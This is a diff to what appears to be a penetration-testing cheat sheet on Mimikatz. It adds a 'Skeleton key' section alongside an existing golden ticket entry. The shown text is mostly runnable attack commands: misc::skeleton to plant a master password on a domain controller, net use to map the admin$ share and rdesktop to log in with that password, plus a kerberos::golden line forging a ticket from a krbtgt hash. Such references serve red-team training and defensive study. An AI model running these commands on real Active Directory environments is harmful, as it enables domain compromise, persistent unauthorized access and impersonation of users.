@@ -22,6 +22,16 @@ Mimikatz Golden ticket
 .\mimikatz "kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt" exit
 ```
 
+Mimikatz Skeleton key
+```
+privilege::debug
+misc::skeleton
+
+# map the share
+net use p: \\WIN-PTELU2U07KG\admin$ /user:john mimikatz
+# login as someone
+rdesktop 10.0.0.2:3389 -u test -p mimikatz -d pentestlab
+```
 
 
 ## Mimikatz commands
@@ -62,3 +72,4 @@ More informations can be grabbed from the Memory with :
 
 ## Thanks to
  * [Unofficial Guide to Mimikatz & Command Reference](https://adsecurity.org/?page_id=1821)
+ * [Skeleton Key](https://pentestlab.blog/2018/04/10/skeleton-key/)
